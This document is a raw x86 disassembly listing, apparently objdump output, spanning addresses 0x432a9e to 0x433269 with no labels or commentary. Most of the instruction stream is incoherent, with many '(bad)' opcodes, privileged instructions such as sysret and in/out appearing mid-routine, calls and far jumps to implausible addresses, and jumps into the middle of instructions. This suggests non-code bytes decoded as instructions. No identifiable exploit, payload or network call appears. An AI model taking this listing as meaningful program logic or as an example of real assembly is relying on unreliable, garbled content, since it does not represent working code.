  432a9e:	add    bh,al
  432aa0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432aa6:	add    BYTE PTR [ecx+0x4540100f],cl
  432aac:	mov    ebp,eax
  432aae:	mov    ebp,edi
  432ab0:	lock call edx
  432ab3:	fcom   DWORD PTR [ebp+0x45]
  432ab6:	mov    eax,0x148a8b
  432abb:	push   ecx
  432abc:	enter  0xc145,0x83
  432ac0:	cmp    ecx,DWORD PTR [eax]
  432ac2:	add    BYTE PTR [ebp+0x4d],al
  432ac5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432acb:	call   0xffa3263a
  432ad0:	cmp    eax,DWORD PTR [ebp-0xc]
  432ad3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432ad7:	push   ebp
  432ad8:	(bad)  
  432ad9:	call   0x3428dd
  432ade:	mov    bh,0xdb
  432ae0:	cld    
  432ae1:	or     BYTE PTR [ebp+0x45],bl
  432ae4:	(bad)  
  432ae5:	call   0xff7d2775
  432aea:	add    al,BYTE PTR [ebp+0x37]
  432aed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432af3:	jne    0x432af5
  432af5:	(bad)  
  432af6:	cmp    edi,esp
  432af8:	jne    0x432b2b
  432afa:	mov    edi,edi
  432afc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b02:	pop    ds
  432b03:	into   
  432b04:	je     0x432ac7
  432b06:	mov    ebx,DWORD PTR [esi]
  432b08:	or     BYTE PTR [ebp-0x49],al
  432b0b:	mov    esp,DWORD PTR [esi-0x77]
  432b0e:	mov    esi,0x2451f0c
  432b13:	mov    eax,DWORD PTR [eax]
  432b15:	or     al,0x66
  432b17:	sar    bl,0x3b
  432b1a:	xor    esi,DWORD PTR [ebp+0x66]
  432b1d:	xor    ecx,edi
  432b1f:	pop    edi
  432b20:	adc    bl,BYTE PTR [ebx+0x7e]
  432b23:	ret    0xff
  432b26:	cld    
  432b27:	inc    ebp
  432b28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432b2e:	cld    
  432b2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432b36:	push   0xffffff83
  432b38:	pop    edi
  432b39:	or     BYTE PTR [ebp+0x53],dh
  432b3c:	xorps  xmm1,xmm2
  432b3f:	test   BYTE PTR [eax+eax*1],bh
  432b42:	add    BYTE PTR [eax],al
  432b44:	adc    eax,eax
  432b46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432b4e:	jmp    DWORD PTR [eax]
  432b50:	ror    al,0x5e
  432b53:	inc    ebp
  432b54:	leave  
  432b55:	xor    ecx,DWORD PTR [eax]
  432b57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432b5d:	add    ah,al
  432b5f:	xor    edi,edi
  432b61:	xor    DWORD PTR [ebx],0x66003302
  432b67:	mov    DWORD PTR [ebp-0xc],ecx
  432b6a:	pcmpgtw mm0,mm0
  432b6d:	add    dl,ah
  432b6f:	leave  
  432b70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b74:	push   eax
  432b75:	dec    ebp
  432b76:	mov    esi,DWORD PTR [ebx-0x75]
  432b79:	lea    ebp,[eax-0x7c00ff02]
  432b7f:	xor    eax,DWORD PTR [eax]
  432b81:	sysret 
  432b83:	dec    ebp
  432b84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b8b:	push   WORD PTR [ecx+0x8]
  432b8f:	jne    0x432b52
  432b91:	ud0    ecx,DWORD PTR [ecx]
  432b94:	mov    eax,edx
  432b96:	lods   al,BYTE PTR ds:[esi]
  432b97:	add    BYTE PTR [eax],al
  432b99:	data16 (bad) 
  432b9b:	iret   
  432b9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ba3:	cli    
  432ba4:	inc    ebp
  432ba5:	cmp    al,0x8d
  432ba7:	add    BYTE PTR [esi+0x2d],ah
  432baa:	inc    ebp
  432bab:	pop    ebp
  432bac:	lea    ecx,[edi]
  432bae:	mov    dl,bh
  432bb0:	add    BYTE PTR [edi],cl
  432bb2:	mov    DWORD PTR [eax+eax*8],edi
  432bb5:	mov    ebx,0x3b87
  432bba:	add    BYTE PTR [ebx],ch
  432bbc:	inc    ebp
  432bbd:	data16 (bad) 
  432bbf:	clc    
  432bc0:	int3   
  432bc1:	cmp    eax,DWORD PTR [eax]
  432bc3:	je     0x432b4e
  432bc5:	push   0xffffffc8
  432bc7:	pop    edi
  432bc8:	xchg   DWORD PTR [ebp+0x0],eax
  432bcb:	data16 add BYTE PTR [ebp+0x45],cl
  432bcf:	lea    cx,[ebp+0x10]
  432bd3:	jb     0x432bd5
  432bd5:	jmp    0x432b60
  432bd7:	call   eax
  432bd9:	clc    
  432bda:	xchg   DWORD PTR [edi+0x1],edi
  432bdd:	mov    eax,DWORD PTR [eax]
  432bdf:	or     BYTE PTR [ebp-0x49],al
  432be2:	lea    eax,[eax+0x74003154]
  432be8:	push   edi
  432be9:	inc    edx
  432bea:	jge    0x432beb
  432bec:	mov    DWORD PTR [edi],ecx
  432bee:	fdiv   DWORD PTR [edi-0x6]
  432bf1:	inc    DWORD PTR [eax]
  432bf3:	xor    edx,DWORD PTR [eax+0x5f]
  432bf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432bf9:	ret    0x0
  432bfc:	xor    BYTE PTR [ebp-0x51],cl
  432bff:	cmp    edi,0xf0ff89fe
  432c05:	data16 ror al,0x84
  432c09:	rol    BYTE PTR [eax],0x3b
  432c0c:	add    al,dh
  432c0e:	dec    eax
  432c0f:	xchg   esp,eax
  432c10:	push   ebx
  432c11:	jmp    0x432b9e
  432c13:	push   ebp
  432c14:	add    esp,ebp
  432c16:	add    ebp,esp
  432c18:	mov    edx,DWORD PTR [edi+0x24]
  432c1b:	clc    
  432c1c:	dec    esi
  432c1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432c23:	cmp    BYTE PTR [ebx],al
  432c25:	jne    0x432bb0
  432c27:	xor    esp,eax
  432c29:	jmp    0x462dac
  432c2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432c31:	jne    0x432c27
  432c33:	call   0xffcd298d
  432c38:	clc    
  432c39:	xchg   edi,eax
  432c3a:	sti    
  432c3b:	add    DWORD PTR [ebx],eax
  432c3d:	add    BYTE PTR [ebp+0x47],bl
  432c40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c46:	pop    ebp
  432c47:	mov    DWORD PTR [esi-0x48],esi
  432c4a:	jmp    0x432c93
  432c4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c52:	(bad)  
  432c54:	cmp    al,0x0
  432c56:	cmp    eax,DWORD PTR [ebp+0x18]
  432c59:	lea    ebx,[ebp-0x56]
  432c5c:	jle    0x432c5e
  432c5e:	jae    0x432be9
  432c60:	mov    eax,esp
  432c62:	call   0xb900:0x8b005587
  432c69:	inc    ebp
  432c6a:	push   ebp
  432c6b:	lea    ecx,[ebp-0x27ff4f12]
  432c71:	mov    eax,edi
  432c73:	int3   
  432c74:	push   ebp
  432c75:	xchg   edi,eax
  432c77:	add    esp,ebp
  432c79:	add    BYTE PTR [eax],al
  432c7b:	inc    ebp
  432c7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432c82:	cld    
  432c83:	mov    DWORD PTR [edx],edi
  432c85:	aam    0x75
  432c87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c8d:	mov    DWORD PTR [ebx-0x50],edx
  432c90:	test   BYTE PTR [ebp-0x1],0xe8
  432c94:	mov    eax,DWORD PTR [eax]
  432c96:	hlt    
  432c97:	add    al,al
  432c99:	mov    eax,DWORD PTR ds:0x890045a8
  432c9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432ca5:	inc    DWORD PTR [eax*2+0xf75854d]
  432cac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432cb2:	call   0x729989f3
  432cb7:	je     0x432d17
  432cb9:	js     0x432d1a
  432cbb:	lock ret 0x7e
  432cbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432cc5:	mov    edi,edi
  432cc7:	sbb    al,bl
  432cc9:	clc    
  432cca:	add    BYTE PTR [ebp-0x73],bh
  432ccd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432cd3:	ror    BYTE PTR [eax],1
  432cd5:	dec    ebp
  432cd6:	xchg   ebp,eax
  432cd7:	mov    edi,edi
  432cd9:	in     al,0x8b
  432cdb:	jge    0x432c66
  432cdd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ce3:	clc    
  432ce4:	pop    esi
  432ce5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432ceb:	clc    
  432cec:	add    al,0x6e
  432cee:	mov    eax,DWORD PTR [ebx]
  432cf0:	mov    BYTE PTR [ebp+0x0],dl
  432cf3:	mov    edx,DWORD PTR [ebx-0x20]
  432cf6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432cfc:	add    eax,0x3b3b73
  432d01:	adc    al,0x89
  432d03:	pop    eax
  432d04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d08:	ret    0xf08
  432d0b:	cmp    al,0x2
  432d0d:	mov    edx,eax
  432d0f:	cld    
  432d10:	add    BYTE PTR [ebp+0x66],dl
  432d13:	add    eax,ebx
  432d15:	add    esp,eax
  432d17:	sub    eax,eax
  432d19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d1f:	add    BYTE PTR [eax],al
  432d21:	mov    DWORD PTR [ebx-0x24],ebx
  432d24:	push   edi
  432d25:	push   ebp
  432d26:	clc    
  432d27:	add    DWORD PTR [esi+0x1b0100],0x45
  432d2e:	out    0xff,eax
  432d30:	add    edx,DWORD PTR [eax]
  432d32:	jmp    0x432d1c
  432d34:	cmp    ch,0x46
  432d37:	(bad)  
  432d38:	jmp    0x40c8b58a
  432d3d:	je     0x432cc9
  432d3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432d45:	inc    ebp
  432d46:	add    BYTE PTR [ebx-0x770375],al
  432d4c:	add    ah,ch
  432d4e:	add    edx,esp
  432d50:	pop    edi
  432d51:	pop    ebp
  432d52:	push   ebp
  432d53:	inc    ebx
  432d54:	in     al,dx
  432d55:	pop    ebp
  432d56:	in     al,dx
  432d57:	cmp    edx,DWORD PTR [edi-0x8]
  432d5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432d61:	add    al,0x47
  432d63:	push   ebp
  432d64:	mov    esp,ebp
  432d66:	in     al,0x45
  432d68:	dec    ebp
  432d69:	push   esi
  432d6a:	test   DWORD PTR [eax+0xfb010f],esi
  432d70:	add    BYTE PTR [eax+0xc018b],dh
  432d76:	leave  
  432d77:	inc    ebp
  432d78:	test   al,ch
  432d7a:	add    dh,bh
  432d7c:	add    bh,bh
  432d7e:	dec    ebp
  432d7f:	push   cs
  432d80:	mov    DWORD PTR [ecx],eax
  432d82:	hlt    
  432d83:	push   es
  432d84:	dec    ebp
  432d85:	leave  
  432d86:	mov    DWORD PTR [eax],ecx
  432d88:	clc    
  432d89:	cmovge eax,ecx
  432d8c:	mov    ecx,0x85c2f0
  432d92:	clc    
  432d93:	pop    DWORD PTR [ebp+0x1]
  432d96:	push   ebx
  432d97:	add    BYTE PTR [ebp-0x15],bh
  432d9a:	push   esi
  432d9b:	xor    eax,0x898a45
  432da0:	cld    
  432da1:	add    al,BYTE PTR [ebp+0x0]
  432da4:	xor    esp,DWORD PTR [esi-0x64]
  432da7:	add    DWORD PTR [esi+0x78308c1],edi
  432dad:	add    ah,BYTE PTR [ebp-0x49]
  432db0:	int    0xbb
  432db2:	mov    ecx,DWORD PTR [esi+0xc]
  432db5:	add    dh,al
  432db7:	cmp    ecx,ebx
  432db9:	jne    0x432d83
  432dbb:	xor    ecx,DWORD PTR [ebp+0x66]
  432dbe:	jmp    0xca2dc4
  432dc3:	add    DWORD PTR [ebp+0x0],eax
  432dc6:	mov    eax,ebx
  432dc8:	or     al,0x8b
  432dca:	(bad)  
  432dcb:	mov    ecx,esi
  432dcd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432dd4:	mov    eax,edi
  432dd6:	or     BYTE PTR [edx],cl
  432dd8:	shl    cl,cl
  432dda:	icebp  
  432ddb:	add    BYTE PTR [ebp+0x38],0x8b
  432ddf:	or     BYTE PTR [edx+eax*2],cl
  432de2:	(bad)  
  432de3:	or     cl,dh
  432de5:	stc    
  432de6:	shl    DWORD PTR [ebp-0x30],0xc6
  432dea:	xor    al,0x0
  432dec:	inc    ebp
  432ded:	xchg   BYTE PTR [ebx],al
  432def:	add    esp,edi
  432df1:	add    BYTE PTR [ebp-0x39],cl
  432df4:	mov    al,bl
  432df6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dfc:	sub    al,0xbf
  432dfe:	jmp    0x432d85
  432e00:	mov    edi,eax
  432e02:	lock jge 0x432df6
  432e05:	lea    esi,[edx-0x74bad5ff]
  432e0b:	mov    ebp,esp
  432e0d:	or     cl,dh
  432e0f:	leave  
  432e10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e17:	dec    ebp
  432e18:	dec    ebp
  432e19:	test   DWORD PTR [ebx],eax
  432e1b:	paddb  mm6,mm0
  432e1e:	add    DWORD PTR [eax],eax
  432e20:	dec    ebp
  432e21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432e27:	mov    esi,DWORD PTR [edx]
  432e29:	or     al,0x2b
  432e2b:	dec    ebp
  432e2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432e32:	mov    esp,edi
  432e34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432e3b:	mov    DWORD PTR [ebx],ebp
  432e3d:	call   0xc76b76d
  432e42:	mov    DWORD PTR [ebp+0x10],ecx
  432e45:	(bad)  
  432e46:	push   0x8b85ff10
  432e4b:	clc    
  432e4c:	or     al,0x54
  432e4e:	(bad)  
  432e4f:	push   ecx
  432e50:	retf   
  432e51:	mov    ebx,0xff4d8dc8
  432e56:	mov    DWORD PTR [ebp+0x8],eax
  432e59:	xor    eax,DWORD PTR [ebp-0x75]
  432e5c:	cmp    ebp,DWORD PTR [ebx]
  432e5e:	lsl    ebx,WORD PTR [edi-0x8]
  432e62:	call   DWORD PTR [ebx-0x741bff75]
  432e68:	(bad)  
  432e69:	or     al,0x5b
  432e6b:	dec    ebp
  432e6c:	or     BYTE PTR [ebx],dh
  432e6e:	inc    ebp
  432e6f:	xor    esi,DWORD PTR ds:0x708088d
  432e75:	in     eax,0x9b
  432e77:	add    BYTE PTR [edx],dh
  432e79:	inc    ebp
  432e7a:	pop    edi
  432e7b:	xor    eax,edx
  432e7d:	test   DWORD PTR [eax],0x81108b8b
  432e83:	dec    ebp
  432e84:	sub    al,0x33
  432e86:	add    BYTE PTR [ebx],dh
  432e88:	push   esi
  432e89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e8f:	mov    edi,eax
  432e91:	or     BYTE PTR [ebp+0x45],al
  432e94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e9a:	xor    ecx,ecx
  432e9c:	pushf  
  432e9d:	push   es
  432e9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432ea5:	dec    ebp
  432ea6:	inc    ebp
  432ea7:	cmp    BYTE PTR [ecx],0x54
  432eaa:	pushf  
  432eab:	gs (bad) 
  432ead:	shl    esp,1
  432eaf:	dec    ebp
  432eb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432eb6:	shr    ecx,1
  432eb8:	xlat   BYTE PTR ds:[ebx]
  432eb9:	rol    bh,cl
  432ebb:	mov    edx,esp
  432ebd:	or     BYTE PTR [ebp+0x4588f84d],al
  432ec3:	mov    ecx,DWORD PTR [eax]
  432ec5:	or     BYTE PTR [eax],al
  432ec7:	push   ebp
  432ec8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432ece:	dec    ebp
  432ecf:	enter  0xceba,0x8
  432ed3:	retf   0x1807
  432ed6:	ret    0x9b4d
  432ed9:	mov    esi,DWORD PTR [edx]
  432edb:	or     al,0x33
  432edd:	into   
  432ede:	add    edx,esi
  432ee0:	add    ecx,edx
  432ee2:	bswap  eax
  432ee4:	ror    esi,0x98
  432ee7:	dec    ebp
  432ee8:	add    cl,ch
  432eea:	mov    edi,edi
  432eec:	hlt    
  432eed:	inc    esi
  432eef:	inc    ebp
  432ef0:	ret    0x4533
  432ef3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ef9:	or     BYTE PTR [ebx],dh
  432efb:	dec    ebp
  432efc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f02:	jne    0xff8d2ec9
  432f08:	inc    ebp
  432f09:	inc    ebp
  432f0a:	mov    esi,DWORD PTR [ebx]
  432f0c:	clc    
  432f0d:	pop    esi
  432f0e:	ret    0xcaeb
  432f11:	mov    eax,esi
  432f13:	call   0x520483e6
  432f18:	dec    ebp
  432f19:	add    eax,0xf8728b
  432f1e:	adc    eax,0xce0ccac9
  432f23:	push   ebp
  432f24:	ret    0xc6ec
  432f27:	in     al,dx
  432f28:	call   0x33437c31
  432f2d:	push   edi
  432f2e:	add    edi,eax
  432f30:	xor    eax,eax
  432f32:	jmp    0x432f79
  432f34:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432f3a:	add    eax,edi
  432f3c:	shr    eax,cl
  432f3e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f44:	mov    esi,DWORD PTR [edx]
  432f46:	in     al,dx
  432f47:	pushf  
  432f48:	ret    0x84c7
  432f4b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432f51:	inc    ebp
  432f52:	in     al,dx
  432f53:	xor    DWORD PTR [ebp-0x64],eax
  432f56:	mov    eax,edi
  432f58:	cld    
  432f59:	fmul   st(2),st
  432f5b:	sbb    dl,al
  432f5d:	jmp    0x9c3b:0x304d45c1
  432f64:	jbe    0x432f2d
  432f66:	mov    esp,eax
  432f68:	clc    
  432f69:	add    BYTE PTR [ebp+0x0],cl
  432f6c:	mov    ecx,ecx
  432f6e:	lea    eax,[ebp-0x5]
  432f71:	mov    edi,edi
  432f73:	call   0x51ce83bd
  432f78:	hlt    
  432f79:	xor    eax,edx
  432f7b:	mov    esi,0x9b7284
  432f80:	xor    cl,dl
  432f82:	mov    esi,eax
  432f84:	hlt    
  432f85:	into   
  432f86:	inc    ebp
  432f87:	scas   eax,DWORD PTR es:[edi]
  432f88:	mov    ebp,ecx
  432f8a:	cld    
  432f8b:	add    dl,cl
  432f8d:	add    dl,al
  432f8f:	inc    ebp
  432f90:	shr    DWORD PTR [ebx],0x4d
  432f93:	xor    edi,DWORD PTR [ebx]
  432f95:	mov    DWORD PTR [edi],ecx
  432f97:	clc    
  432f98:	dec    esi
  432f99:	inc    ebp
  432f9a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432fa0:	ret    0xc6ca
  432fa3:	mov    BYTE PTR [ebp-0x32],0x53
  432fa7:	scas   eax,DWORD PTR es:[edi]
  432fa8:	inc    ebp
  432fa9:	jmp    0x432fdb
  432fab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432fb2:	pop    ebx
  432fb3:	xor    ecx,DWORD PTR [ebp+0x3]
  432fb6:	mov    eax,DWORD PTR [ebx]
  432fb8:	clc    
  432fb9:	test   edx,ecx
  432fbb:	mov    ecx,esi
  432fbd:	cld    
  432fbe:	call   0x8ab77508
  432fc3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432fc9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432fcf:	fdiv   QWORD PTR [ebx]
  432fd1:	retf   0xce89
  432fd4:	in     al,0xc1
  432fd6:	inc    ebp
  432fd7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fdd:	into   
  432fde:	mov    dh,0xc1
  432fe1:	call   0x8c17756a
  432fe6:	(bad)  
  432fe7:	cld    
  432fe8:	mov    ecx,DWORD PTR [ebp-0x14]
  432feb:	xor    eax,ecx
  432fed:	lea    eax,[ebp+0x8]
  432ff0:	mov    esi,DWORD PTR [edx-0x4]
  432ff3:	add    dl,al
  432ff5:	inc    ebp
  432ff6:	mov    esp,0x32d89b8b
  432ffb:	dec    ebp
  432ffc:	mov    esi,DWORD PTR [ebx]
  432ffe:	cld    
  432fff:	xor    eax,edx
  433001:	sub    esp,DWORD PTR [ebp-0x75]
  433004:	int    0xec
  433006:	sub    ecx,eax
  433008:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43300e:	mov    esi,esp
  433010:	call   0x34177d99
  433015:	inc    DWORD PTR [ebx]
  433017:	mov    edi,DWORD PTR [ebx]
  433019:	cld    
  43301a:	jne    0x433069
  43301c:	mov    esi,DWORD PTR [ebx]
  43301e:	aam    0x8d
  433020:	dec    ebp
  433021:	or     BYTE PTR [ebx],dh
  433023:	jb     0x433028
  433025:	add    BYTE PTR [edi+0x45],bl
  433028:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43302f:	xor    ebp,esp
  433031:	xor    eax,edi
  433033:	sub    edi,esp
  433035:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43303b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433042:	inc    ebp
  433043:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433049:	clc    
  43304a:	mov    eax,edi
  43304c:	nop
  43304d:	fadd   QWORD PTR [eax]
  43304f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433055:	jmp    0x432fe0
  433057:	mov    eax,DWORD PTR [ecx]
  433059:	fadd   DWORD PTR [eax]
  43305b:	inc    ebp
  43305c:	or     DWORD PTR [ebx],esi
  43305e:	dec    eax
  43305f:	add    edx,DWORD PTR [ebx-0x2d]
  433062:	dec    ebp
  433063:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433069:	inc    ebp
  43306a:	push   esp
  43306b:	mov    dl,BYTE PTR [ecx-0xd]
  43306e:	xor    ecx,DWORD PTR [ebp-0x45]
  433071:	(bad)  
  433073:	rol    BYTE PTR [eax],0xc1
  433076:	ret    
  433077:	inc    ebp
  433078:	inc    ebp
  433079:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43307f:	xor    eax,ebx
  433081:	add    eax,DWORD PTR [ebp+0x23]
  433084:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43308a:	cmp    edi,0xc
  43308d:	dec    ebp
  43308e:	inc    ebp
  43308f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433095:	inc    ebp
  433096:	mov    esi,DWORD PTR [ebx]
  433098:	clc    
  433099:	lea    eax,[ebp+0x45725407]
  43309f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4330a3:	xor    edi,DWORD PTR [eax]
  4330a5:	mov    ecx,0xff8b8d4d
  4330aa:	push   esp
  4330ab:	enter  0x4df7,0x23
  4330af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4330b5:	mov    eax,DWORD PTR [ebx]
  4330b7:	loopne 0x4330a4
  4330b9:	ret    0xc68b
  4330bc:	push   esp
  4330bd:	enter  0x9745,0x8b
  4330c1:	inc    ebp
  4330c2:	cld    
  4330c3:	mov    eax,edi
  4330c5:	clc    
  4330c6:	ret    
  4330c7:	ret    0xc645
  4330ca:	mov    esi,DWORD PTR [ebx]
  4330cc:	cld    
  4330cd:	pop    esi
  4330ce:	mov    ebx,0x83458bc3
  4330d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4330d8:	dec    ebp
  4330d9:	xor    DWORD PTR [ebx],esi
  4330db:	pushf  
  4330dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4330e2:	fcom   DWORD PTR [ebp+0x45]
  4330e5:	mov    esi,DWORD PTR [ebx]
  4330e7:	adc    al,0x9c
  4330e9:	inc    ebp
  4330ea:	(bad)  
  4330eb:	mov    ebx,eax
  4330ed:	adc    al,0x85
  4330ef:	cmp    al,0x1
  4330f2:	inc    ebp
  4330f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4330f9:	mov    eax,DWORD PTR [ebx]
  4330fb:	nop
  4330fc:	add    BYTE PTR [eax],al
  4330fe:	inc    ebp
  4330ff:	mov    esi,DWORD PTR [ebx]
  433101:	add    eax,DWORD PTR [ebx]
  433103:	cmp    al,0x89
  433105:	mov    esp,esi
  433107:	clc    
  433108:	inc    ebp
  433109:	inc    ebp
  43310a:	add    edx,DWORD PTR [esi+0xc]
  43310d:	mov    edi,0x7ff0845
  433112:	in     al,dx
  433113:	(bad)  
  433114:	jne    0x4330b1
  433116:	mov    esi,DWORD PTR [edx]
  433118:	clc    
  433119:	add    ebp,DWORD PTR [esi]
  43311b:	mov    edi,edi
  43311d:	in     al,dx
  43311e:	mov    DWORD PTR [ebp-0x10],eax
  433121:	xor    eax,DWORD PTR [ebp+0x3]
  433124:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43312a:	fmul   DWORD PTR [ebx-0x173caf39]
  433130:	lea    ecx,[ecx+0x45e8d4bc]
  433136:	clc    
  433137:	mov    edi,edi
  433139:	cmp    BYTE PTR [ebp+0x4d],al
  43313c:	test   DWORD PTR [eax+0x74],ecx
  43313f:	inc    ecx
  433140:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433146:	ret    
  433147:	inc    eax
  433148:	dec    DWORD PTR [ebx+0x4945f8f0]
  43314e:	push   eax
  43314f:	dec    eax
  433150:	test   al,0xd0
  433152:	dec    eax
  433154:	mov    eax,DWORD PTR [ebp-0x14]
  433157:	mov    eax,DWORD PTR [ebp+0x38]
  43315a:	mov    eax,ecx
  43315c:	fadd   DWORD PTR [ebx]
  43315e:	dec    ebp
  43315f:	inc    eax
  433160:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433166:	inc    ebp
  433167:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43316d:	fadd   QWORD PTR [ebx]
  43316f:	inc    ebp
  433170:	or     al,0x33
  433172:	dec    ebp
  433173:	add    edi,DWORD PTR [ebx]
  433175:	mov    DWORD PTR [edx-0x28],esi
  433178:	mov    eax,DWORD PTR [ebp-0x10]
  43317b:	mov    eax,DWORD PTR [eax+0x10]
  43317e:	mov    eax,edi
  433180:	lock ret 
  433182:	inc    ecx
  433183:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433189:	fsubr  st,st(5)
  43318b:	test   DWORD PTR [eax],eax
  43318d:	clc    
  43318e:	push   0x45
  433190:	(bad)  
  433191:	cmp    al,0xec
  433193:	pushf  
  433194:	inc    ebp
  433195:	(bad)  
  433196:	push   eax
  433197:	fsub   DWORD PTR [eax-0x7b]
  43319a:	(bad)  
  43319b:	clc    
  43319c:	mov    eax,0xf8008584
  4331a1:	mov    eax,DWORD PTR [ebp-0x4]
  4331a4:	mov    edi,0x4585c3cc
  4331aa:	clc    
  4331ab:	mov    eax,DWORD PTR [ebp+0x14]
  4331ae:	xor    eax,DWORD PTR [ebp-0x64]
  4331b1:	mov    edi,eax
  4331b3:	in     al,dx
  4331b4:	les    esi,FWORD PTR [ebp-0x7b]
  4331b7:	mov    edi,eax
  4331b9:	or     al,0x4d
  4331bb:	dec    ebp
  4331bc:	mov    eax,ebp
  4331be:	in     al,0xf2
  4331c0:	dec    ebp
  4331c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4331c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4331cd:	inc    ebp
  4331ce:	mov    DWORD PTR [ebx],esi
  4331d0:	fadd   QWORD PTR [ebx]
  4331d2:	dec    ebp
  4331d3:	push   eax
  4331d4:	xor    eax,DWORD PTR [ebp+0x3]
  4331d7:	push   eax
  4331d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4331db:	push   esi
  4331dd:	mov    eax,DWORD PTR [eax]
  4331df:	lock cmp eax,0xf84e85c0
  4331e5:	inc    ebp
  4331e6:	test   BYTE PTR [ebx],dh
  4331e8:	add    DWORD PTR [ebx],eax
  4331ea:	add    BYTE PTR [eax+0x4d],dl
  4331ed:	jne    0x433222
  4331ef:	lea    ecx,[ebx-0x7617fc44]
  4331f5:	div    ah
  4331f7:	inc    DWORD PTR [ebp+0x45]
  4331fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433200:	jb     0x43318d
  433202:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433209:	mov    ecx,DWORD PTR [ebp-0x10]
  43320c:	xor    ecx,DWORD PTR [ebp+0x3]
  43320f:	mov    edi,DWORD PTR [ebx]
  433211:	adc    BYTE PTR [ebp+0x41],dh
  433214:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43321a:	ret    
  43321b:	push   ss
  43321c:	push   0x45
  43321e:	lea    ecx,[ebx+0x4de80cb0]
  433224:	sti    
  433225:	add    edi,edi
  433227:	or     BYTE PTR [ebp+0x4d],al
  43322a:	mov    ebp,DWORD PTR [ebx]
  43322c:	xor    ebp,ecx
  43322e:	mov    al,BYTE PTR [edx]
  433230:	add    eax,0xc7200
  433235:	jne    0x433284
  433237:	lea    esi,[ebx]
  433239:	mov    al,0xf
  43323b:	call   0xf2900
  433240:	shl    DWORD PTR [ecx],0x84
  433243:	pushf  
  433244:	add    DWORD PTR [ecx+0x4545d000],ecx
  43324a:	mov    esi,DWORD PTR [edx]
  43324c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433253:	test   DWORD PTR [eax],eax
  433255:	clc    
  433256:	dec    ebp
  433257:	inc    ebp
  433258:	xor    edi,DWORD PTR [edi+ecx*1]
  43325b:	pushf  
  43325c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433263:	lea    eax,[ecx]
  433265:	int3   
  433266:	add    BYTE PTR [ebp+0x45],cl
  433269:	lea    ecx,[ebx-0x75b2cc38]
